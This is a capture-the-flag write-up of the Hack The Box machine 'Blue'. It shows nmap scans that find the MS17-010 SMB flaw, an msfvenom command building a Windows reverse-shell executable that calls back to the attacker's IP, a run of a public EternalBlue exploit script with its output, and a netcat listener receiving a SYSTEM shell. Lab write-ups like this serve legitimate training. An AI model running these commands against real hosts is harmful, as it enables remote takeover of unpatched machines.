---
title: CTF Writeup - HTB Blue
date: 2023-10-30
author: kei5uke
description: Writeup for HTB Blue
tags:
  - windows
  - writeup
---

# Blue

# Enumeration

## Nmap

```bash
┌──(parallels㉿kali)-[~/blue]
└─$ nmap -sV -sC -p- 10.129.80.136 -T4 -oN nmap.txt         
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-30 22:19 EET
Nmap scan report for 10.129.80.136
Host is up (0.041s latency).
Not shown: 65526 closed tcp ports (conn-refused)
PORT      STATE SERVICE     VERSION
135/tcp   open  msrpc       Microsoft Windows RPC
139/tcp   open  netbios-ssn Microsoft Windows netbios-ssn
445/tcp   open            Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc       Microsoft Windows RPC
49153/tcp open  msrpc       Microsoft Windows RPC
49154/tcp open  msrpc       Microsoft Windows RPC
49155/tcp open  msrpc       Microsoft Windows RPC
49156/tcp open  msrpc       Microsoft Windows RPC
49157/tcp open  msrpc       Microsoft Windows RPC
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required
|_clock-skew: mean: 0s, deviation: 2s, median: -2s
| smb2-time: 
|   date: 2023-10-30T20:21:08
|_  start_date: 2023-10-30T20:16:04
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: haris-PC
|   NetBIOS computer name: HARIS-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-10-30T20:21:12+00:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 116.50 seconds
```

This is likely an SMB vulnerability.


```bash
┌──(root💀kali)-[/home/parallels/blue]
└─# nmap -sV -sC -sT --script=smb-vuln* 10.129.80.136                                                                    1 ⨯
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-30 22:49 EET
Nmap scan report for 10.129.80.136
Host is up (0.063s latency).
Not shown: 991 closed tcp ports (conn-refused)
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND
|_smb-vuln-ms10-054: false

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 75.53 seconds
```

External blue!

```bash
┌──(root💀kali)-[/home/parallels/blue]
└─# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.22 LPORT=4444 EXITFUNC=thread -f exe -a x86 --platform windows -o reverse_shell.exe 
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
Saved as: reverse_shell.exe
```

Created a reverse shell.

```bash
┌──(root💀kali)-[/home/parallels/blue]
└─# python send_and_execute.py 10.129.80.136 ./reverse_shell.exe
Trying to connect to 10.129.80.136:445
Target OS: Windows 7 Professional 7601 Service Pack 1
Using named pipe: browser
Target is 64 bit
Got frag size: 0x10
GROOM_POOL_SIZE: 0x5030
BRIDE_TRANS_SIZE: 0xfa0
CONNECTION: 0xfffffa8001989ba0
SESSION: 0xfffff8a002059060
FLINK: 0xfffff8a0022bc048
InParam: 0xfffff8a00302815c
MID: 0x50b
unexpected alignment, diff: 0x-d6cfb8
leak failed... try again
CONNECTION: 0xfffffa8001989ba0
SESSION: 0xfffff8a002059060
FLINK: 0xfffff8a00303a088
InParam: 0xfffff8a00303415c
MID: 0x503
success controlling groom transaction
modify trans1 struct for arbitrary read/write
make this SMB session to be SYSTEM
overwriting session security context
Sending file 309V9Y.exe...
Opening SVCManager on 10.129.80.136.....
Creating service YPCl.....
Starting service YPCl.....
The NETBIOS connection with the remote host timed out.
Removing service YPCl.....
ServiceExec Error on: 10.129.80.136
nca_s_proto_error
Done
```

[](https://github.com/helviojunior/MS17-010/blob/master/send_and_execute.py)

I ran the script above and got the shell

```bash
┌──(root💀kali)-[/home/parallels/blue/AutoBlue-MS17-010]
└─# rlwrap nc -lvnp 4444                                                                                                  1 ⨯
listening on [any] 4444 ...
connect to [10.10.16.22] from (UNKNOWN) [10.129.80.136] 49161
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>
```

# Root code

![Screenshot 2023-10-30 at 23.20.49.png](Blue%203093795c1edc4ced88d2327361535a2c/Screenshot_2023-10-30_at_23.20.49.png)

# Note

Don’t forget to run vulnerability scripts with Nmap. They could be useful.